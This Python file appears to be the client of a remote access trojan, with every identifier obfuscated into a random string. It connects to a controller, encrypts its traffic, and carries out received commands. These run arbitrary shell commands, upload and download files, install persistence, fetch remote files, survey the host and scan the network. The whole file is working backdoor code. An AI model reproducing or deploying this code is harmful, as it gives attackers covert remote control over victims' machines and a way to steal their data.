#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import zcqgzrNhhMMrepGKrXzOYcYeaRymVspf, gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ, ZHmaXjmaptcjOuQWzIYmNcRFyCaggAdR
    from core.filesock import uBnCzheoKMvSEYNltgSkBmyfdIkCfmLO, OLxWjqoEVTGyIdmtAzGMiyvWpgJuSYVT
    from core.persistence import xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz
    from core.scan import gwhsEXhmXTHzYVlQiiEdGOqoneHqHRbR
    from core.survey import xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz
    from core.toolkit import buyFmCSWGTBfvISGQIWFLtElgktcqpgK, azYcCKZXPAlsEILbtinhYEYbdmYFLcdm
except ImportError as MppCVHitpvMJlRKDneMmcrbqSXgRGxkd:
    print(MppCVHitpvMJlRKDneMmcrbqSXgRGxkd)
    sys.exit(0)
QMYnDzLqCihhFBfWnLoDuLXraPrAkiMZ = sys.platform
INdzxZOOPqyiUcpiXPTAiChCuzhcWHtC      = 'localhost'
KheZfodapjkLZMDFBDFqCrfPYwONpXlW      = 1337
FFVGFOvcuiKjdGKFcTRNoKJcuBaGjGEf    = 'b14ce95fa4c33ac2803782d18341869f'
def iLiYzUOEZhisIVzOJGrTCuPtFectnKci():
    OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp = socket.socket()
    OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.connect((INdzxZOOPqyiUcpiXPTAiChCuzhcWHtC, KheZfodapjkLZMDFBDFqCrfPYwONpXlW))
    XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk = ZHmaXjmaptcjOuQWzIYmNcRFyCaggAdR(OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp)
    while True:
        ncokSalpGxrXHDvkUfSBesKvNJEIjuaw = OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.recv(1024)
        ncokSalpGxrXHDvkUfSBesKvNJEIjuaw = zcqgzrNhhMMrepGKrXzOYcYeaRymVspf(ncokSalpGxrXHDvkUfSBesKvNJEIjuaw, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk)
        MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq, _, action = ncokSalpGxrXHDvkUfSBesKvNJEIjuaw.partition(' ')
        if MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'quit':
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.close()
            sys.exit(0)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'run':
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = clbTiTFqUxkqbuQVZtaTgDqCquqcATPC.stdout.read() + clbTiTFqUxkqbuQVZtaTgDqCquqcATPC.stderr.read()
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.sendall(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(clbTiTFqUxkqbuQVZtaTgDqCquqcATPC, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'download':
            for wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf in action.split():
                wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf = wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf.strip()
                OLxWjqoEVTGyIdmtAzGMiyvWpgJuSYVT(OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp, wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'upload':
            for wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf in action.split():
                wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf = wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf.strip()
                uBnCzheoKMvSEYNltgSkBmyfdIkCfmLO(OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp, wqTNCoDdwbmUDUzLKwPqhjHcwrTXTbnf, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'rekey':
            XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk = ZHmaXjmaptcjOuQWzIYmNcRFyCaggAdR(OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp)
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'persistence':
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz(QMYnDzLqCihhFBfWnLoDuLXraPrAkiMZ)
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.send(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(clbTiTFqUxkqbuQVZtaTgDqCquqcATPC, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'wget':
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = buyFmCSWGTBfvISGQIWFLtElgktcqpgK(action)
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.send(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(clbTiTFqUxkqbuQVZtaTgDqCquqcATPC, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'unzip':
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = azYcCKZXPAlsEILbtinhYEYbdmYFLcdm(action)
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.send(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(clbTiTFqUxkqbuQVZtaTgDqCquqcATPC, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'survey':
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz(QMYnDzLqCihhFBfWnLoDuLXraPrAkiMZ)
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.send(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(clbTiTFqUxkqbuQVZtaTgDqCquqcATPC, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
        elif MCkXmgpqtDrzIorMjxGEkSbtuZIQtdwq == 'scan':
            clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = gwhsEXhmXTHzYVlQiiEdGOqoneHqHRbR(action)
            OPGQtyHoGVjbssyoAyqrdJvFlGoiAQYp.send(gcbCoqAgZztElhuzHlCRVsaXiDmrxjeQ(clbTiTFqUxkqbuQVZtaTgDqCquqcATPC, XUYmgxonIOpMcEFzKvlAQgKfuthAhsfk))
if __name__ == '__main__':
    iLiYzUOEZhisIVzOJGrTCuPtFectnKci()
